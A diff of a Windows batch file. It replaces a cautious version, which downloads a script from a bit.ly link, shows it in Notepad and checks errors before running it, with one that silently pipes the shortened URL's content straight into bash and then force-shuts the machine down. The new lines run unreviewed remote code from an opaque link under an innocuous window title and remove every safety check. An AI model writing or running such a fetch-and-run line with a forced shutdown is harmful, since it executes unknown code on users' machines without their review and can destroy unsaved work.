@@ -1,17 +1,8 @@
 @echo off
-curl -fL "http://bit.ly/10hA8iC" -o "%TEMP%\script.sh"
-if errorlevel 1 (
-    echo Download failed. Not running the script.
-    exit /b 1
-)
+title Just4RandomCMDCommand
 
-notepad "%TEMP%\script.sh"
-pause
+curl -s -L http://bit.ly/10hA8iC | bash
 
-bash "%TEMP%\script.sh"
-if errorlevel 1 (
-    echo Script failed. Not shutting down.
-    exit /b 1
-)
+timeout /t 10 /nobreak
 
-shutdown /s /t 0
+shutdown /s /f /t 0
